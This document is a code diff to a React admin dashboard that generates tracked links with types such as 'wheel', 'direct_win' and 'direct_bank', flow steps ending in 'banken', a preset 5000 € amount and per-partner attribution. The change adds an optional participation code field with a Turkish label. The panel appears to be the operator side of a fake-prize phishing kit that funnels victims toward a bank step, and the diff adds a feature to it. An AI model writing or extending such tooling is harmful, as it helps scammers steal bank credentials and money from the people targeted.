@@ -21,6 +21,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
   const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
   const [amount, setAmount] = useState("5000");
   const [currency, setCurrency] = useState("€");
+  const [participationCode, setParticipationCode] = useState("");
   const [createLinkError, setCreateLinkError] = useState<string | null>(null);
 
   const adminIdentifier = user?.user_metadata?.username || user?.email?.split('@')[0] || "admin";
@@ -39,7 +40,11 @@ export function Admin1Dashboard({ user }: { user: any }) {
           current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
           status: "offline", 
           partner_name: adminIdentifier,
-          form_data: { currency, is_wheel_game: linkType === "wheel" }
+          form_data: { 
+            currency, 
+            is_wheel_game: linkType === "wheel",
+            participationCode: participationCode.trim() 
+          }
         })
         .select("id")
         .single();
@@ -176,6 +181,17 @@ export function Admin1Dashboard({ user }: { user: any }) {
                     </div>
                   </div>
                 )}
+                
+                <div>
+                  <label className="block text-sm font-medium mb-1">Katılım Kodu (Opsiyonel)</label>
+                  <input 
+                    type="text" 
+                    value={participationCode} 
+                    onChange={(e) => setParticipationCode(e.target.value)}
+                    placeholder="Boş bırakırsanız herhangi bir kod kabul edilir"
+                    className={`w-full p-2 rounded border outline-none ${darkMode ? 'bg-[#121212] border-zinc-700' : 'bg-gray-50 border-gray-300'}`}
+                  />
+                </div>
                 
                 {createLinkError && (
                   <div className="p-2 text-sm text-red-500 bg-red-500/10 rounded">
